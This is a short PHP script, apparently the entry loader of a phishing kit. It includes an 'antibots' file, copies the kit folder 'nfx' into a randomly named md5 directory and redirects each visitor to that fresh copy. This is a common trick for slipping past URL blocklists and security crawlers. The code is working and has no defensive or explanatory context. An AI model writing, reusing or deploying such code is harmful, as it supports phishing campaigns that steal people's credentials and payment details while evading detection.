<?php

include('nfx/app/antibots.php');

$DIR = md5(rand(111,9999));
$SZ118="nfx";
function recurse_copy($SZ118,$DIR) {
$dir = opendir($SZ118);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($SZ118 . '/' . $file) ) {
recurse_copy($SZ118 . '/' . $file,$DIR . '/' . $file);
}
else {
copy($SZ118 . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $SZ118, $DIR );

//LOCATION !
header("Location: ".$DIR."");